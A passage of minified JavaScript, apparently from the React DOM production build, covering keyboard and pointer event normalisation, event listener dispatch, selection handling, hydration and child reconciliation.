",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},kn={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},xn={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Sn(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):!!(e=xn[e])&&!!t[e]}function En(){return Sn}var jn=U({},dn,{key:function(e){if(e.key){var t=_n[e.key]||e.key;if("Unidentified"!==t)return t}return"keypress"===e.type?13===(e=tn(e))?"Enter":String.fromCharCode(e):"keydown"===e.type||"keyup"===e.type?kn[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:En,charCode:function(e){return"keypress"===e.type?tn(e):0},keyCode:function(e){return"keydown"===e.type||"keyup"===e.type?e.keyCode:0},which:function(e){return"keypress"===e.type?tn(e):"keydown"===e.type||"keyup"===e.type?e.keyCode:0}}),Tn=an(jn),Cn=an(U({},fn,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0})),Nn=an(U({},dn,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:En})),Rn=an(U({},cn,{propertyName:0,elapsedTime:0,pseudoElement:0})),Pn=U({},fn,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),On=an(Pn),An=[9,13,27,32],In=u&&"CompositionEvent"in window,Ln=null;u&&"documentMode"in document&&(Ln=document.documentMode);var Dn=u&&"TextEvent"in window&&!Ln,Un=u&&(!In||Ln&&8<Ln&&11>=Ln),Mn=String.fromCharCode(32),zn=!1;function Bn(e,t){switch(e){case"keyup":return-1!==An.indexOf(t.keyCode);case"keydown":return 229!==t.keyCode;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Fn(e){return"object"===typeof(e=e.detail)&&"data"in e?e.data:null}var Vn=!1;var qn={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Wn(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return"input"===t?!!qn[e.type]:"textarea"===t}function Hn(e,t,n,r){je(r),0<(t=Kr(t,"onChange")).length&&(n=new un("onChange","change",null,n,r),e.push({event:n,listeners:t}))}var Kn=null,Gn=null;function Jn(e){Mr(e,0)}function $n(e){if(G(wa(e)))return e}function Qn(e,t){if("change"===e)return t}var Yn=!1;if(u){var Xn;if(u){var Zn="oninput"in document;if(!Zn){var er=document.createElement("div");er.setAttribute("oninput","return;"),Zn="function"===typeof er.oninput}Xn=Zn}else Xn=!1;Yn=Xn&&(!document.documentMode||9<document.documentMode)}function tr(){Kn&&(Kn.detachEvent("onpropertychange",nr),Gn=Kn=null)}function nr(e){if("value"===e.propertyName&&$n(Gn)){var t=[];Hn(t,Gn,e,_e(e)),Pe(Jn,t)}}function rr(e,t,n){"focusin"===e?(tr(),Gn=n,(Kn=t).attachEvent("onpropertychange",nr)):"focusout"===e&&tr()}function ar(e){if("selectionchange"===e||"keyup"===e||"keydown"===e)return $n(Gn)}function sr(e,t){if("click"===e)return $n(t)}function or(e,t){if("input"===e||"change"===e)return $n(t)}var ir="function"===typeof Object.is?Object.is:function(e,t){return e===t&&(0!==e||1/e===1/t)||e!==e&&t!==t};function lr(e,t){if(ir(e,t))return!0;if("object"!==typeof e||null===e||"object"!==typeof t||null===t)return!1;var n=Object.keys(e),r=Object.keys(t);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var a=n[r];if(!d.call(t,a)||!ir(e[a],t[a]))return!1}return!0}function cr(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function ur(e,t){var n,r=cr(e);for(e=0;r;){if(3===r.nodeType){if(n=e+r.textContent.length,e<=t&&n>=t)return{node:r,offset:t-e};e=n}e:{for(;r;){if(r.nextSibling){r=r.nextSibling;break e}r=r.parentNode}r=void 0}r=cr(r)}}function dr(e,t){return!(!e||!t)&&(e===t||(!e||3!==e.nodeType)&&(t&&3===t.nodeType?dr(e,t.parentNode):"contains"in e?e.contains(t):!!e.compareDocumentPosition&&!!(16&e.compareDocumentPosition(t))))}function hr(){for(var e=window,t=J();t instanceof e.HTMLIFrameElement;){try{var n="string"===typeof t.contentWindow.location.href}catch(r){n=!1}if(!n)break;t=J((e=t.contentWindow).document)}return t}function fr(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&("input"===t&&("text"===e.type||"search"===e.type||"tel"===e.type||"url"===e.type||"password"===e.type)||"textarea"===t||"true"===e.contentEditable)}function pr(e){var t=hr(),n=e.focusedElem,r=e.selectionRange;if(t!==n&&n&&n.ownerDocument&&dr(n.ownerDocument.documentElement,n)){if(null!==r&&fr(n))if(t=r.start,void 0===(e=r.end)&&(e=t),"selectionStart"in n)n.selectionStart=t,n.selectionEnd=Math.min(e,n.value.length);else if((e=(t=n.ownerDocument||document)&&t.defaultView||window).getSelection){e=e.getSelection();var a=n.textContent.length,s=Math.min(r.start,a);r=void 0===r.end?s:Math.min(r.end,a),!e.extend&&s>r&&(a=r,r=s,s=a),a=ur(n,s);var o=ur(n,r);a&&o&&(1!==e.rangeCount||e.anchorNode!==a.node||e.anchorOffset!==a.offset||e.focusNode!==o.node||e.focusOffset!==o.offset)&&((t=t.createRange()).setStart(a.node,a.offset),e.removeAllRanges(),s>r?(e.addRange(t),e.extend(o.node,o.offset)):(t.setEnd(o.node,o.offset),e.addRange(t)))}for(t=[],e=n;e=e.parentNode;)1===e.nodeType&&t.push({element:e,left:e.scrollLeft,top:e.scrollTop});for("function"===typeof n.focus&&n.focus(),n=0;n<t.length;n++)(e=t[n]).element.scrollLeft=e.left,e.element.scrollTop=e.top}}var mr=u&&"documentMode"in document&&11>=document.documentMode,gr=null,vr=null,yr=null,br=!1;function wr(e,t,n){var r=n.window===n?n.document:9===n.nodeType?n:n.ownerDocument;br||null==gr||gr!==J(r)||("selectionStart"in(r=gr)&&fr(r)?r={start:r.selectionStart,end:r.selectionEnd}:r={anchorNode:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection()).anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset},yr&&lr(yr,r)||(yr=r,0<(r=Kr(vr,"onSelect")).length&&(t=new un("onSelect","select",null,t,n),e.push({event:t,listeners:r}),t.target=gr)))}function _r(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n["Webkit"+e]="webkit"+t,n["Moz"+e]="moz"+t,n}var kr={animationend:_r("Animation","AnimationEnd"),animationiteration:_r("Animation","AnimationIteration"),animationstart:_r("Animation","AnimationStart"),transitionend:_r("Transition","TransitionEnd")},xr={},Sr={};function Er(e){if(xr[e])return xr[e];if(!kr[e])return e;var t,n=kr[e];for(t in n)if(n.hasOwnProperty(t)&&t in Sr)return xr[e]=n[t];return e}u&&(Sr=document.createElement("div").style,"AnimationEvent"in window||(delete kr.animationend.animation,delete kr.animationiteration.animation,delete kr.animationstart.animation),"TransitionEvent"in window||delete kr.transitionend.transition);var jr=Er("animationend"),Tr=Er("animationiteration"),Cr=Er("animationstart"),Nr=Er("transitionend"),Rr=new Map,Pr="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Or(e,t){Rr.set(e,t),l(t,[e])}for(var Ar=0;Ar<Pr.length;Ar++){var Ir=Pr[Ar];Or(Ir.toLowerCase(),"on"+(Ir[0].toUpperCase()+Ir.slice(1)))}Or(jr,"onAnimationEnd"),Or(Tr,"onAnimationIteration"),Or(Cr,"onAnimationStart"),Or("dblclick","onDoubleClick"),Or("focusin","onFocus"),Or("focusout","onBlur"),Or(Nr,"onTransitionEnd"),c("onMouseEnter",["mouseout","mouseover"]),c("onMouseLeave",["mouseout","mouseover"]),c("onPointerEnter",["pointerout","pointerover"]),c("onPointerLeave",["pointerout","pointerover"]),l("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),l("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),l("onBeforeInput",["compositionend","keypress","textInput","paste"]),l("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),l("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),l("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Lr="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Dr=new Set("cancel close invalid load scroll toggle".split(" ").concat(Lr));function Ur(e,t,n){var r=e.type||"unknown-event";e.currentTarget=n,function(e,t,n,r,a,o,i,l,c){if(Fe.apply(this,arguments),De){if(!De)throw Error(s(198));var u=Ue;De=!1,Ue=null,Me||(Me=!0,ze=u)}}(r,t,void 0,e),e.currentTarget=null}function Mr(e,t){t=0!==(4&t);for(var n=0;n<e.length;n++){var r=e[n],a=r.event;r=r.listeners;e:{var s=void 0;if(t)for(var o=r.length-1;0<=o;o--){var i=r[o],l=i.instance,c=i.currentTarget;if(i=i.listener,l!==s&&a.isPropagationStopped())break e;Ur(a,i,c),s=l}else for(o=0;o<r.length;o++){if(l=(i=r[o]).instance,c=i.currentTarget,i=i.listener,l!==s&&a.isPropagationStopped())break e;Ur(a,i,c),s=l}}}if(Me)throw e=ze,Me=!1,ze=null,e}function zr(e,t){var n=t[ma];void 0===n&&(n=t[ma]=new Set);var r=e+"__bubble";n.has(r)||(qr(t,e,2,!1),n.add(r))}function Br(e,t,n){var r=0;t&&(r|=4),qr(n,e,r,t)}var Fr="_reactListening"+Math.random().toString(36).slice(2);function Vr(e){if(!e[Fr]){e[Fr]=!0,o.forEach(function(t){"selectionchange"!==t&&(Dr.has(t)||Br(t,!1,e),Br(t,!0,e))});var t=9===e.nodeType?e:e.ownerDocument;null===t||t[Fr]||(t[Fr]=!0,Br("selectionchange",!1,t))}}function qr(e,t,n,r){switch(Qt(t)){case 1:var a=Ht;break;case 4:a=Kt;break;default:a=Gt}n=a.bind(null,t,n,e),a=void 0,!Ae||"touchstart"!==t&&"touchmove"!==t&&"wheel"!==t||(a=!0),r?void 0!==a?e.addEventListener(t,n,{capture:!0,passive:a}):e.addEventListener(t,n,!0):void 0!==a?e.addEventListener(t,n,{passive:a}):e.addEventListener(t,n,!1)}function Wr(e,t,n,r,a){var s=r;if(0===(1&t)&&0===(2&t)&&null!==r)e:for(;;){if(null===r)return;var o=r.tag;if(3===o||4===o){var i=r.stateNode.containerInfo;if(i===a||8===i.nodeType&&i.parentNode===a)break;if(4===o)for(o=r.return;null!==o;){var l=o.tag;if((3===l||4===l)&&((l=o.stateNode.containerInfo)===a||8===l.nodeType&&l.parentNode===a))return;o=o.return}for(;null!==i;){if(null===(o=ya(i)))return;if(5===(l=o.tag)||6===l){r=s=o;continue e}i=i.parentNode}}r=r.return}Pe(function(){var r=s,a=_e(n),o=[];e:{var i=Rr.get(e);if(void 0!==i){var l=un,c=e;switch(e){case"keypress":if(0===tn(n))break e;case"keydown":case"keyup":l=Tn;break;case"focusin":c="focus",l=gn;break;case"focusout":c="blur",l=gn;break;case"beforeblur":case"afterblur":l=gn;break;case"click":if(2===n.button)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":l=pn;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":l=mn;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":l=Nn;break;case jr:case Tr:case Cr:l=vn;break;case Nr:l=Rn;break;case"scroll":l=hn;break;case"wheel":l=On;break;case"copy":case"cut":case"paste":l=bn;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":l=Cn}var u=0!==(4&t),d=!u&&"scroll"===e,h=u?null!==i?i+"Capture":null:i;u=[];for(var f,p=r;null!==p;){var m=(f=p).stateNode;if(5===f.tag&&null!==m&&(f=m,null!==h&&(null!=(m=Oe(p,h))&&u.push(Hr(p,m,f)))),d)break;p=p.return}0<u.length&&(i=new l(i,c,null,n,a),o.push({event:i,listeners:u}))}}if(0===(7&t)){if(l="mouseout"===e||"pointerout"===e,(!(i="mouseover"===e||"pointerover"===e)||n===we||!(c=n.relatedTarget||n.fromElement)||!ya(c)&&!c[pa])&&(l||i)&&(i=a.window===a?a:(i=a.ownerDocument)?i.defaultView||i.parentWindow:window,l?(l=r,null!==(c=(c=n.relatedTarget||n.toElement)?ya(c):null)&&(c!==(d=Ve(c))||5!==c.tag&&6!==c.tag)&&(c=null)):(l=null,c=r),l!==c)){if(u=pn,m="onMouseLeave",h="onMouseEnter",p="mouse","pointerout"!==e&&"pointerover"!==e||(u=Cn,m="onPointerLeave",h="onPointerEnter",p="pointer"),d=null==l?i:wa(l),f=null==c?i:wa(c),(i=new u(m,p+"leave",l,n,a)).target=d,i.relatedTarget=f,m=null,ya(a)===r&&((u=new u(h,p+"enter",c,n,a)).target=f,u.relatedTarget=d,m=u),d=m,l&&c)e:{for(h=c,p=0,f=u=l;f;f=Gr(f))p++;for(f=0,m=h;m;m=Gr(m))f++;for(;0<p-f;)u=Gr(u),p--;for(;0<f-p;)h=Gr(h),f--;for(;p--;){if(u===h||null!==h&&u===h.alternate)break e;u=Gr(u),h=Gr(h)}u=null}else u=null;null!==l&&Jr(o,i,l,u,!1),null!==c&&null!==d&&Jr(o,d,c,u,!0)}if("select"===(l=(i=r?wa(r):window).nodeName&&i.nodeName.toLowerCase())||"input"===l&&"file"===i.type)var g=Qn;else if(Wn(i))if(Yn)g=or;else{g=ar;var v=rr}else(l=i.nodeName)&&"input"===l.toLowerCase()&&("checkbox"===i.type||"radio"===i.type)&&(g=sr);switch(g&&(g=g(e,r))?Hn(o,g,n,a):(v&&v(e,i,r),"focusout"===e&&(v=i._wrapperState)&&v.controlled&&"number"===i.type&&ee(i,"number",i.value)),v=r?wa(r):window,e){case"focusin":(Wn(v)||"true"===v.contentEditable)&&(gr=v,vr=r,yr=null);break;case"focusout":yr=vr=gr=null;break;case"mousedown":br=!0;break;case"contextmenu":case"mouseup":case"dragend":br=!1,wr(o,n,a);break;case"selectionchange":if(mr)break;case"keydown":case"keyup":wr(o,n,a)}var y;if(In)e:{switch(e){case"compositionstart":var b="onCompositionStart";break e;case"compositionend":b="onCompositionEnd";break e;case"compositionupdate":b="onCompositionUpdate";break e}b=void 0}else Vn?Bn(e,n)&&(b="onCompositionEnd"):"keydown"===e&&229===n.keyCode&&(b="onCompositionStart");b&&(Un&&"ko"!==n.locale&&(Vn||"onCompositionStart"!==b?"onCompositionEnd"===b&&Vn&&(y=en()):(Xt="value"in(Yt=a)?Yt.value:Yt.textContent,Vn=!0)),0<(v=Kr(r,b)).length&&(b=new wn(b,e,null,n,a),o.push({event:b,listeners:v}),y?b.data=y:null!==(y=Fn(n))&&(b.data=y))),(y=Dn?function(e,t){switch(e){case"compositionend":return Fn(t);case"keypress":return 32!==t.which?null:(zn=!0,Mn);case"textInput":return(e=t.data)===Mn&&zn?null:e;default:return null}}(e,n):function(e,t){if(Vn)return"compositionend"===e||!In&&Bn(e,t)?(e=en(),Zt=Xt=Yt=null,Vn=!1,e):null;switch(e){case"paste":default:return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return Un&&"ko"!==t.locale?null:t.data}}(e,n))&&(0<(r=Kr(r,"onBeforeInput")).length&&(a=new wn("onBeforeInput","beforeinput",null,n,a),o.push({event:a,listeners:r}),a.data=y))}Mr(o,t)})}function Hr(e,t,n){return{instance:e,listener:t,currentTarget:n}}function Kr(e,t){for(var n=t+"Capture",r=[];null!==e;){var a=e,s=a.stateNode;5===a.tag&&null!==s&&(a=s,null!=(s=Oe(e,n))&&r.unshift(Hr(e,s,a)),null!=(s=Oe(e,t))&&r.push(Hr(e,s,a))),e=e.return}return r}function Gr(e){if(null===e)return null;do{e=e.return}while(e&&5!==e.tag);return e||null}function Jr(e,t,n,r,a){for(var s=t._reactName,o=[];null!==n&&n!==r;){var i=n,l=i.alternate,c=i.stateNode;if(null!==l&&l===r)break;5===i.tag&&null!==c&&(i=c,a?null!=(l=Oe(n,s))&&o.unshift(Hr(n,l,i)):a||null!=(l=Oe(n,s))&&o.push(Hr(n,l,i))),n=n.return}0!==o.length&&e.push({event:t,listeners:o})}var $r=/\r\n?/g,Qr=/\u0000|\uFFFD/g;function Yr(e){return("string"===typeof e?e:""+e).replace($r,"\n").replace(Qr,"")}function Xr(e,t,n){if(t=Yr(t),Yr(e)!==t&&n)throw Error(s(425))}function Zr(){}var ea=null,ta=null;function na(e,t){return"textarea"===e||"noscript"===e||"string"===typeof t.children||"number"===typeof t.children||"object"===typeof t.dangerouslySetInnerHTML&&null!==t.dangerouslySetInnerHTML&&null!=t.dangerouslySetInnerHTML.__html}var ra="function"===typeof setTimeout?setTimeout:void 0,aa="function"===typeof clearTimeout?clearTimeout:void 0,sa="function"===typeof Promise?Promise:void 0,oa="function"===typeof queueMicrotask?queueMicrotask:"undefined"!==typeof sa?function(e){return sa.resolve(null).then(e).catch(ia)}:ra;function ia(e){setTimeout(function(){throw e})}function la(e,t){var n=t,r=0;do{var a=n.nextSibling;if(e.removeChild(n),a&&8===a.nodeType)if("/$"===(n=a.data)){if(0===r)return e.removeChild(a),void Vt(t);r--}else"$"!==n&&"$?"!==n&&"$!"!==n||r++;n=a}while(n);Vt(t)}function ca(e){for(;null!=e;e=e.nextSibling){var t=e.nodeType;if(1===t||3===t)break;if(8===t){if("$"===(t=e.data)||"$!"===t||"$?"===t)break;if("/$"===t)return null}}return e}function ua(e){e=e.previousSibling;for(var t=0;e;){if(8===e.nodeType){var n=e.data;if("$"===n||"$!"===n||"$?"===n){if(0===t)return e;t--}else"/$"===n&&t++}e=e.previousSibling}return null}var da=Math.random().toString(36).slice(2),ha="__reactFiber$"+da,fa="__reactProps$"+da,pa="__reactContainer$"+da,ma="__reactEvents$"+da,ga="__reactListeners$"+da,va="__reactHandles$"+da;function ya(e){var t=e[ha];if(t)return t;for(var n=e.parentNode;n;){if(t=n[pa]||n[ha]){if(n=t.alternate,null!==t.child||null!==n&&null!==n.child)for(e=ua(e);null!==e;){if(n=e[ha])return n;e=ua(e)}return t}n=(e=n).parentNode}return null}function ba(e){return!(e=e[ha]||e[pa])||5!==e.tag&&6!==e.tag&&13!==e.tag&&3!==e.tag?null:e}function wa(e){if(5===e.tag||6===e.tag)return e.stateNode;throw Error(s(33))}function _a(e){return e[fa]||null}var ka=[],xa=-1;function Sa(e){return{current:e}}function Ea(e){0>xa||(e.current=ka[xa],ka[xa]=null,xa--)}function ja(e,t){xa++,ka[xa]=e.current,e.current=t}var Ta={},Ca=Sa(Ta),Na=Sa(!1),Ra=Ta;function Pa(e,t){var n=e.type.contextTypes;if(!n)return Ta;var r=e.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===t)return r.__reactInternalMemoizedMaskedChildContext;var a,s={};for(a in n)s[a]=t[a];return r&&((e=e.stateNode).__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=s),s}function Oa(e){return null!==(e=e.childContextTypes)&&void 0!==e}function Aa(){Ea(Na),Ea(Ca)}function Ia(e,t,n){if(Ca.current!==Ta)throw Error(s(168));ja(Ca,t),ja(Na,n)}function La(e,t,n){var r=e.stateNode;if(t=t.childContextTypes,"function"!==typeof r.getChildContext)return n;for(var a in r=r.getChildContext())if(!(a in t))throw Error(s(108,q(e)||"Unknown",a));return U({},n,r)}function Da(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||Ta,Ra=Ca.current,ja(Ca,e),ja(Na,Na.current),!0}function Ua(e,t,n){var r=e.stateNode;if(!r)throw Error(s(169));n?(e=La(e,t,Ra),r.__reactInternalMemoizedMergedChildContext=e,Ea(Na),Ea(Ca),ja(Ca,e)):Ea(Na),ja(Na,n)}var Ma=null,za=!1,Ba=!1;function Fa(e){null===Ma?Ma=[e]:Ma.push(e)}function Va(){if(!Ba&&null!==Ma){Ba=!0;var e=0,t=bt;try{var n=Ma;for(bt=1;e<n.length;e++){var r=n[e];do{r=r(!0)}while(null!==r)}Ma=null,za=!1}catch(a){throw null!==Ma&&(Ma=Ma.slice(e+1)),Ge(Ze,Va),a}finally{bt=t,Ba=!1}}return null}var qa=[],Wa=0,Ha=null,Ka=0,Ga=[],Ja=0,$a=null,Qa=1,Ya="";function Xa(e,t){qa[Wa++]=Ka,qa[Wa++]=Ha,Ha=e,Ka=t}function Za(e,t,n){Ga[Ja++]=Qa,Ga[Ja++]=Ya,Ga[Ja++]=$a,$a=e;var r=Qa;e=Ya;var a=32-ot(r)-1;r&=~(1<<a),n+=1;var s=32-ot(t)+a;if(30<s){var o=a-a%5;s=(r&(1<<o)-1).toString(32),r>>=o,a-=o,Qa=1<<32-ot(t)+a|n<<a|r,Ya=s+e}else Qa=1<<s|n<<a|r,Ya=e}function es(e){null!==e.return&&(Xa(e,1),Za(e,1,0))}function ts(e){for(;e===Ha;)Ha=qa[--Wa],qa[Wa]=null,Ka=qa[--Wa],qa[Wa]=null;for(;e===$a;)$a=Ga[--Ja],Ga[Ja]=null,Ya=Ga[--Ja],Ga[Ja]=null,Qa=Ga[--Ja],Ga[Ja]=null}var ns=null,rs=null,as=!1,ss=null;function os(e,t){var n=Rc(5,null,null,0);n.elementType="DELETED",n.stateNode=t,n.return=e,null===(t=e.deletions)?(e.deletions=[n],e.flags|=16):t.push(n)}function is(e,t){switch(e.tag){case 5:var n=e.type;return null!==(t=1!==t.nodeType||n.toLowerCase()!==t.nodeName.toLowerCase()?null:t)&&(e.stateNode=t,ns=e,rs=ca(t.firstChild),!0);case 6:return null!==(t=""===e.pendingProps||3!==t.nodeType?null:t)&&(e.stateNode=t,ns=e,rs=null,!0);case 13:return null!==(t=8!==t.nodeType?null:t)&&(n=null!==$a?{id:Qa,overflow:Ya}:null,e.memoizedState={dehydrated:t,treeContext:n,retryLane:1073741824},(n=Rc(18,null,null,0)).stateNode=t,n.return=e,e.child=n,ns=e,rs=null,!0);default:return!1}}function ls(e){return 0!==(1&e.mode)&&0===(128&e.flags)}function cs(e){if(as){var t=rs;if(t){var n=t;if(!is(e,t)){if(ls(e))throw Error(s(418));t=ca(n.nextSibling);var r=ns;t&&is(e,t)?os(r,n):(e.flags=-4097&e.flags|2,as=!1,ns=e)}}else{if(ls(e))throw Error(s(418));e.flags=-4097&e.flags|2,as=!1,ns=e}}}function us(e){for(e=e.return;null!==e&&5!==e.tag&&3!==e.tag&&13!==e.tag;)e=e.return;ns=e}function ds(e){if(e!==ns)return!1;if(!as)return us(e),as=!0,!1;var t;if((t=3!==e.tag)&&!(t=5!==e.tag)&&(t="head"!==(t=e.type)&&"body"!==t&&!na(e.type,e.memoizedProps)),t&&(t=rs)){if(ls(e))throw hs(),Error(s(418));for(;t;)os(e,t),t=ca(t.nextSibling)}if(us(e),13===e.tag){if(!(e=null!==(e=e.memoizedState)?e.dehydrated:null))throw Error(s(317));e:{for(e=e.nextSibling,t=0;e;){if(8===e.nodeType){var n=e.data;if("/$"===n){if(0===t){rs=ca(e.nextSibling);break e}t--}else"$"!==n&&"$!"!==n&&"$?"!==n||t++}e=e.nextSibling}rs=null}}else rs=ns?ca(e.stateNode.nextSibling):null;return!0}function hs(){for(var e=rs;e;)e=ca(e.nextSibling)}function fs(){rs=ns=null,as=!1}function ps(e){null===ss?ss=[e]:ss.push(e)}var ms=w.ReactCurrentBatchConfig;function gs(e,t,n){if(null!==(e=n.ref)&&"function"!==typeof e&&"object"!==typeof e){if(n._owner){if(n=n._owner){if(1!==n.tag)throw Error(s(309));var r=n.stateNode}if(!r)throw Error(s(147,e));var a=r,o=""+e;return null!==t&&null!==t.ref&&"function"===typeof t.ref&&t.ref._stringRef===o?t.ref:(t=function(e){var t=a.refs;null===e?delete t[o]:t[o]=e},t._stringRef=o,t)}if("string"!==typeof e)throw Error(s(284));if(!n._owner)throw Error(s(290,e))}return e}function vs(e,t){throw e=Object.prototype.toString.call(t),Error(s(31,"[object Object]"===e?"object with keys {"+Object.keys(t).join(", ")+"}":e))}function ys(e){return(0,e._init)(e._payload)}function bs(e){function t(t,n){if(e){var r=t.deletions;null===r?(t.deletions=[n],t.flags|=16):r.push(n)}}function n(n,r){if(!e)return null;for(;null!==r;)t(n,r),r=r.sibling;return null}function r(e,t){for(e=new Map;null!==t;)null!==t.key?e.set(t.key,t):e.set(t.index,t),t=t.sibling;return e}function a(e,t){return(e=Oc(e,t)).index=0,e.sibling=null,e}function o(t,n,r){return t.index=r,e?null!==(r=t.alternate)?(r=r.index)<n?(t.flags|=2,n):r:(t.flags|=2,n):(t.flags|=1048576,n)}function i(t){return e&&null===t.alternate&&(t.flags|=2),t}function l(e,t,n,r){return null===t||6!==t.tag?((t=Dc(n,e.mode,r)).return=e,t):((t=a(t,n)).return=e,t)}function c(e,t,n,r){var s=n.type;return s===x?d(e,t,n.props.children,r,n.key):null!==t&&(t.elementType===s||"object"===typeof s&&null!==s&&s.$$typeof===O&&ys(s)===t.type)?((r=a(t,n.props)).ref=gs(e,t,n),r.return=e,r):((r=Ac(n.type,n.key,n.props,null,e.mode,r)).ref=gs(e,t,n),r.return=e,r)}function u(e,t,n,r){return null===t||4!==t.tag||t.stateNode.containerInfo!==n.containerInfo||t.stateNode.implementation!==n.implementation?((t=Uc(n,e.mode,r)).return=e,t):((t=a(t,n.children||[])).return=e,t)}function d(e,t,n,r,s){return null===t||7!==t.tag?((t=Ic(n,e.mode,r,s)).return=e,t):((t=a(t,n)).return=e,t)}function h(e,t,n){if("string"===typeof t&&""!==t||"number"===typeof t)return(t=Dc(""+t,e.mode,n)).return=e,t;if("object"===typeof t&&null!==t){switch(t.$$typeof){case _:return(n=Ac(t.type,t.key,t.props,null,e.mode,n)).ref=gs(e,null,t),n.return=e,n;case k:return(t=Uc(t,e.mode,n)).return=e,t;case O:return h(e,(0,t._init)(t._payload),n)}if(te(t)||L(t))return(t=Ic(t,e.mode,n,null)).return=e,t;vs(e,t)}return null}function f(e,t,n,r){var a=null!==t?t.key:null;if("string"===typeof n&&""!==n||"number"===typeof n)return null!==a?null:l(e,t,""+n,r);if("object"===typeof n&&null!==n){switch(n.$$typeof){case _:return n.key===a?c(e,t,n,r):null;case k:return n.key===a?u(e,t,n,r):null;case O:return f(e,t,(a=n._init)(n._payload),r)}if(te(n)||L(n))return null!==a?null:d(e,t,n,r,null);vs(e,n)}return null}function p(e,t,n,r,a){if("string"===typeof r&&""!==r||"number"===typeof r)return l(t,e=e.get(n)||null,""+r,a);if("object"===typeof r&&null!==r){switch(r.$$typeof){case _:return c(t,e=e.get(null===r.key?n:r.key)||null,r,a);case k:return u(t,e=e.get(null===r.key?n:r.key)||null,r,a);case O:return p(e,t,n,(0,r._init)(r._payload),a)}if(te(r)||L(r))return d(t,e=e.get(n)||null,r,a,null);vs(t,r)}return null}function m(a,s,i,l){for(var c=null,u=null,d=s,m=s=0,g=null;null!==d&&m<i.length;m++){d.index>m?(g=d,d=null):g=d.sibling;var v=f(a,d,i[m],l);if(null===v){null===d&&(d=g);break}e&&d&&null===v.alternate&&t(a,d),s=o(v,s,m),null===u?c=v:u.sibling=v,u=v,d=g}if(m===i.length)return n(a,d),as&&Xa(a,m),c;if(null===d){for(;m<i.length;m++)null!==(d=h(a,i[m],l))&&(s=o(d,s,m),null===u?c=d:u.sibling=d,u=d);return as&&Xa(a,m),c}for(d=r(a,d);m<i.length;m++)null!==(g=p(d,a,m,i[m],l))&&(e&&null!==g.alternate&&d.delete(null===g.key?m:g.key),s=o(g,s,m),null===u?c=g:u.sibling=g,u=g);return e&&d.forEach(function(e){return t(a,e)}),as&&Xa(a,m),c}function g(a,i,l,c){var u=L(l);if("function"!==typeof u)throw Error(s(150));if(null==(l=u.call(l)))throw Error(s(151));for(var d=u=null,m=i,g=i=0,v=null,y=l.next();null!==m&&!y.done;g++,y=l.next()){m.index>g?(v=m,m=null):v=m.sibling;var 